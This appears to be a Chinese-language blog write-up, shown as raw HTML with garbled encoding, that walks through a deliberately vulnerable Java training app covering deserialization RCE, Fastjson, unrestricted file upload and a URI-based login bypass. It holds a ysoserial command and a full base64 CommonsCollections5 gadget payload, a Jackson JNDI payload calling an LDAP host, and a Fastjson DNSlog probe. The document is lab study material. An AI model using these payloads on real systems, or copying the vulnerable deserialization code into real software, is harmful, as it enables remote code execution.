java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InvalidClassException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.springframework.web.util.WebUtils.getCookie;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Deserialize RCE using Commons-Collections gadget.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> JoyChou @2018-06-14</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/deserialize&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Deserialize</span> &#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(<span class="hljs-built_in">this</span>.getClass());<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * java -jar ysoserial.jar CommonsCollections5 &quot;open -a Calculator&quot; | base64 &lt;br&gt;</span><br><span class="hljs-comment">     * &lt;a href=&quot;http://localhost:8080/deserialize/rememberMe/vuln&quot;&gt;http://localhost:8080/deserialize/rememberMe/vuln&lt;/a&gt;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/rememberMe/vuln&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">rememberMeVul</span><span class="hljs-params">(HttpServletRequest request)</span><br>            <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br><br>        <span class="hljs-comment">//ä»è¯·æ±‚ä¸­è¯»å– rememberMe cookie</span><br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> getCookie(request, Constants.REMEMBER_ME_COOKIE);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == cookie) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No rememberMe cookie. Right?&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">//å°† rememberMe cookie ä¸­ Base64 ç¼–ç çš„æ•°æ®è¿›è¡Œè§£ç </span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">rememberMe</span> <span class="hljs-operator">=</span> cookie.getValue();<br>        <span class="hljs-type">byte</span>[] decoded = Base64.getDecoder().decode(rememberMe);<br><br>        <span class="hljs-comment">//å°† byte[] åŒ…è£…æˆå­—èŠ‚è¾“å…¥æµ</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bytes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decoded);<br>        <span class="hljs-comment">//æ„é€  ObjectInputStream å¯¹è±¡ï¼Œä»æµä¸­è¯»å–å¯¹è±¡ï¼Œ</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bytes);<br>        <span class="hljs-comment">//è¯»å–å­—èŠ‚æµä¸­çš„å¯¹è±¡ï¼Œè¿›è¡Œååºåˆ—åŒ–ï¼Œè‹¥ cookie ä¸­åŒ…å«æ¶æ„ç±»ï¼Œå°†è¢«æ‰§è¡Œ</span><br>        in.readObject();<br>        in.close();<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Are u ok?&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Check deserialize class using black list. &lt;br&gt;</span><br><span class="hljs-comment">     * Or update commons-collections to 3.2.2 or above.Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons.To enable it set system property &#x27;org.apache.commons.collections.enableUnsafeSerialization&#x27; to &#x27;true&#x27;,but you must ensure that your application does not de-serialize objects from untrusted sources.&lt;br&gt;</span><br><span class="hljs-comment">     * &lt;a href=&quot;http://localhost:8080/deserialize/rememberMe/security&quot;&gt;http://localhost:8080/deserialize/rememberMe/security&lt;/a&gt;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">//é»‘åå•è¿‡æ»¤</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/rememberMe/security&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">rememberMeBlackClassCheck</span><span class="hljs-params">(HttpServletRequest request)</span><br>            <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br><br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> getCookie(request, Constants.REMEMBER_ME_COOKIE);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == cookie) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No rememberMe cookie. Right?&quot;</span>;<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">rememberMe</span> <span class="hljs-operator">=</span> cookie.getValue();<br>        <span class="hljs-type">byte</span>[] decoded = Base64.getDecoder().decode(rememberMe);<br><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bytes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decoded);<br><br>        <span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">//ä½¿ç”¨è‡ªå®šä¹‰ AntObjectInputStream ç±»è¿›è¡Œååºåˆ—åŒ–ã€‚è¯¥ç±»å†…éƒ¨é€šè¿‡é»‘åå•æœºåˆ¶ç¦æ­¢ä¸€äº›å·²çŸ¥çš„æ¶æ„ç±»</span><br>            <span class="hljs-type">AntObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AntObjectInputStream</span>(bytes);  <span class="hljs-comment">// throw InvalidClassException</span><br>            in.readObject();<br>            in.close();<br>        &#125; <span class="hljs-keyword">catch</span> (InvalidClassException e) &#123;<br>            logger.info(e.toString());<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I&#x27;m very OK.&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// String payload = &quot;[\&quot;org.jsecurity.realm.jndi.JndiRealmFactory\&quot;, &#123;\&quot;jndiNames\&quot;:\&quot;ldap://30.196.97.50:1389/yto8pc\&quot;&#125;]&quot;;</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/jackson&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Jackson</span><span class="hljs-params">(String payload)</span> &#123;<br>        <span class="hljs-comment">//ObjectMapper æ˜¯ Jackson æä¾›çš„ JSON è§£æå™¨</span><br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>        mapper.enableDefaultTyping();<br>        <span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">//ååºåˆ—åŒ–ç”¨æˆ·è¾“å…¥çš„ JSON </span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> mapper.readValue(payload, Object.class);<br>            mapper.writeValueAsString(obj);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>æ¼æ´åˆ©ç”¨ï¼š</strong></p><p>ysoserial.jar ç”Ÿæˆ payloadï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">è·¯ç”±ï¼š<br>/deserialize/rememberMe/vuln<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">Windowsï¼š<br><br>java -jar ~<span class="hljs-string">/ysoserial.jar</span> CommonsCollections5 calc | base64<br><br>rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YW<span class="hljs-keyword">ls</span>TWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dG<span class="hljs-keyword">ls</span>LkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dG<span class="hljs-keyword">ls</span>L0NvbGxlY3Rpb247eHBzcgATamF2YS51dG<span class="hljs-keyword">ls</span>LkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dG<span class="hljs-keyword">ls</span>L01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQABGNhbGN0AARleGVjdXEAfgAyAAAAAXEAfgA3c3EAfgAnc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dG<span class="hljs-keyword">ls</span>Lkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4<br></code></pre></td></tr></table></figure><p>ä¹‹ååœ¨ cookie ä¸­åŠ å…¥payloadï¼š</p><p><strong>æ³¨æ„ï¼š rememberMe &#x3D; &lt;payload&gt;</strong> </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080934983.png" alt="20250724132100840"></p><p>å‘åŒ…åä¼šå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080934545.png" alt="20250724132234120"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080934976.png" alt="20250724132330738"></p><h2 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h2><p>è§¦å‘ç‚¹:  JSON.parseObject()      JSON.parse()</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080934865.png" alt="20250724134123264"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/fastjson&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fastjson</span> &#123;<br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/deserialize&quot;, method = &#123;RequestMethod.POST&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">Deserialize</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String params)</span> &#123;<br>        <span class="hljs-comment">// å¦‚æœContent-Typeä¸è®¾ç½®application/jsonæ ¼å¼ï¼Œpostæ•°æ®ä¼šè¢«urlç¼–ç </span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// å°†postæäº¤çš„stringè½¬æ¢ä¸ºjson</span><br>            <span class="hljs-comment">//Fastjson æ¡†æ¶å°†å­—ç¬¦ä¸²è§£æä¸º JSONObject å¯¹è±¡</span><br>            <span class="hljs-type">JSONObject</span> <span class="hljs-variable">ob</span> <span class="hljs-operator">=</span> JSON.parseObject(params);<br>            <span class="hljs-keyword">return</span> ob.get(<span class="hljs-string">&quot;name&quot;</span>).toString();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>æ¼æ´åˆ©ç”¨ï¼š</strong></p><p>post è¯·æ±‚ &#x2F;fastjson&#x2F;deserialize ï¼Œä¼ è¾“ <strong>application&#x2F;json</strong> æ ¼å¼æ•°æ®</p><p>payload:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;name&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;2jf0vy.dnslog.cn&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935795.png" alt="20250724135345425"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935897.png" alt="20250724135353947"></p><h2 id="FileUpload"><a href="#FileUpload" class="headerlink" title="FileUpload"></a>FileUpload</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/file&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileUpload</span> &#123;<br><br>    <span class="hljs-comment">// Save the uploaded file to this folder</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">UPLOADED_FOLDER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(<span class="hljs-built_in">this</span>.getClass());<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">randomFilePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-comment">// uplaod any file</span><br>    <span class="hljs-meta">@GetMapping(&quot;/any&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;upload&quot;</span>; <span class="hljs-comment">// return upload.html page</span><br>    &#125;<br><br>    <span class="hljs-comment">// only allow to upload pictures</span><br>    <span class="hljs-meta">@GetMapping(&quot;/pic&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">uploadPic</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;uploadPic&quot;</span>; <span class="hljs-comment">// return uploadPic.html page</span><br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/upload&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">singleFileUpload</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file,</span><br><span class="hljs-params">                                   RedirectAttributes redirectAttributes)</span> &#123;<br>        <span class="hljs-keyword">if</span> (file.isEmpty()) &#123;<br>            <span class="hljs-comment">// èµ‹å€¼ç»™uploadStatus.htmlé‡Œçš„åŠ¨æ€å‚æ•°message</span><br>            redirectAttributes.addFlashAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;Please select a file to upload&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/file/status&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// Get the file and save it somewhere</span><br>            <span class="hljs-type">byte</span>[] bytes = file.getBytes();<br>            <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());<br>            Files.write(path, bytes);<br><br>            redirectAttributes.addFlashAttribute(<span class="hljs-string">&quot;message&quot;</span>,<br>                    <span class="hljs-string">&quot;You successfully uploaded &#x27;&quot;</span> + UPLOADED_FOLDER + file.getOriginalFilename() + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br><br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            redirectAttributes.addFlashAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;upload failed&quot;</span>);<br>            logger.error(e.toString());<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/file/status&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>æœªå¯¹æ–‡ä»¶åã€åç¼€åè¿›è¡Œè¿‡æ»¤ï¼Œç›´æ¥ä¸Šä¼ æ–‡ä»¶ã€‚</p><p><strong>æ¼æ´åˆ©ç”¨ï¼š</strong></p><p>åŠŸèƒ½ç‚¹ï¼š<a href="http://127.0.0.1:8081/file/any">http://127.0.0.1:8081/file/any</a> ï¼Œå¯ä»¥ä¸Šä¼ ä»»æ„æ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935394.png" alt="20250724141442245"></p><h2 id="GetRequestURI"><a href="#GetRequestURI" class="headerlink" title="GetRequestURI"></a>GetRequestURI</h2><blockquote><p>request.getRequestURL() è¿”å›å…¨è·¯å¾„</p><p>request.getRequestURI() è¿”å›é™¤å»hostï¼ˆåŸŸåæˆ–è€…ipï¼‰éƒ¨åˆ†çš„è·¯å¾„</p><p>request.getContextPath() è¿”å›å·¥ç¨‹åéƒ¨åˆ†ï¼Œå¦‚æœå·¥ç¨‹æ˜ å°„ä¸º&#x2F;ï¼Œæ­¤å¤„è¿”å›åˆ™ä¸ºç©º</p><p>request.getServletPath() è¿”å›é™¤å»hostå’Œå·¥ç¨‹åéƒ¨åˆ†çš„è·¯å¾„</p><p>ä¾‹å¦‚ï¼š</p><p>request.getRequestURL() <a href="http://localhost:8080/jqueryLearn/resources/request.jsp">http://localhost:8080/jqueryLearn/resources/request.jsp</a><br>request.getRequestURI() &#x2F;jqueryLearn&#x2F;resources&#x2F;request.jsp<br>request.getContextPath()&#x2F;jqueryLearn<br>request.getServletPath()&#x2F;resources&#x2F;request.jsp </p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;uri&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetRequestURI</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(<span class="hljs-built_in">this</span>.getClass());<br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/exclued/vuln&quot;)</span><br>    <span class="hljs-comment">//æ–¹æ³•æ¥æ”¶ HttpServletRequest ç”¨äºè·å–å½“å‰è¯·æ±‚çš„ URIã€è·¯å¾„ç­‰ä¿¡æ¯</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">exclued</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br><br>        <span class="hljs-comment">//è‹¥è¯·æ±‚è·¯å¾„åŒ¹é… /css/** å’Œ /js/** è·¯å¾„ï¼Œå°±è·³è¿‡ç™»å½•</span><br>        String[] excluedPath = &#123;<span class="hljs-string">&quot;/css/**&quot;</span>, <span class="hljs-string">&quot;/js/**&quot;</span>&#125;;<br>        <span class="hljs-comment">//è·å–è¯·æ±‚ URI</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI(); <span class="hljs-comment">// Security: request.getServletPath()</span><br>        <span class="hljs-type">PathMatcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AntPathMatcher</span>();<br><br>        <span class="hljs-comment">//æ‰“å° getRequestURI() å’Œ getServletPath() çš„ç»“æœ</span><br>        logger.info(<span class="hljs-string">&quot;getRequestURI: &quot;</span> + uri);<br>        logger.info(<span class="hljs-string">&quot;getServletPath: &quot;</span> + request.getServletPath());<br><br>        <span class="hljs-comment">//éå†æ‰€æœ‰æ’é™¤è§„åˆ™ï¼Œå¦‚æœå½“å‰è¯·æ±‚ URI åŒ¹é…ä»»æ„è§„åˆ™ï¼Œåˆ™è®¤ä¸ºç»•è¿‡ç™»å½•æ ¡éªŒ</span><br>        <span class="hljs-keyword">for</span> (String path : excluedPath) &#123;<br>            <span class="hljs-keyword">if</span> (matcher.match(path, uri)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You have bypassed the login page.&quot;</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//å¦‚æœè¯·æ±‚è·¯å¾„ä¸åŒ¹é…æ’é™¤è§„åˆ™ï¼Œåˆ™è¿”å›æç¤ºé¡µé¢æ˜¯ç™»å½•é¡µã€‚</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;This is a login page &gt;..&lt;&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªå¥‡æ€ªçš„ç‚¹ï¼š<code>@RequestMapping(&quot;uri&quot;)</code></p><p>æ³¨é‡Šä¸­éƒ½æ²¡æœ‰åŠ  <code>uri</code> ï¼Œå¦‚æœä¸åŠ  <code>uri</code> ä¸‹é¢çš„å…¨éƒ¨è®¿é—®ä¸åˆ°ï¼Œä½†æ˜¯ <code>getRequestURI() è¿”å›é™¤å» hostï¼ˆåŸŸåæˆ–è€…ipï¼‰éƒ¨åˆ†çš„è·¯å¾„</code> ä¸€å®šä¼šåŒ…å«  <code>uri</code> ï¼Œè¿™å°±å¯¼è‡´ <code>String[] excluedPath = {&quot;/css/**&quot;, &quot;/js/**&quot;};</code> å®Œå…¨èµ·ä¸åˆ°ä½œç”¨ï¼Œå› ä¸º <code>getRequestURI() </code>è¿”å›ä¸º <code>/uri/...</code>ï¼Œå¯¼è‡´åŒ¹é…ä¸åˆ° <code>&quot;/css/**&quot;, &quot;/js/**&quot;</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935768.png" alt="20250724151631951"></p><p>æµ‹è¯•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(&quot;/testPath&quot;)</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testPath</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>       <span class="hljs-comment">// è¿”å›å½“å‰è¯·æ±‚çš„å®Œæ•´è·¯å¾„ å’Œ servletPath</span><br>       <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI();<br>       <span class="hljs-type">String</span> <span 